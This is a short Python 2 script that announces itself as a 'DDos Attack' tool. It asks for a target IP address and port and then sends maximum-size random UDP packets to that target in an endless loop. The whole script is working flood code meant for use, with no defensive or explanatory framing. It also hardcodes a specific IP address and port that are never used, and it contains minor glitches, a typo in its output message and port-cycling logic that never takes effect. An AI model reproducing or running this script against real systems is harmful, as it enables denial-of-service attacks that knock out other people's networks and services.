import os
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(65507)  # Increased from 1490 to 65507
#############

ipstr = "20.204.39.185"
portstr = "23411"

os.system("clear")
os.system("figlet DDos Attack")
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     print ("Sent %s pac7ket to %s throught port:%s"%(sent,ip,port))
     if port == 65534:
       port = 1

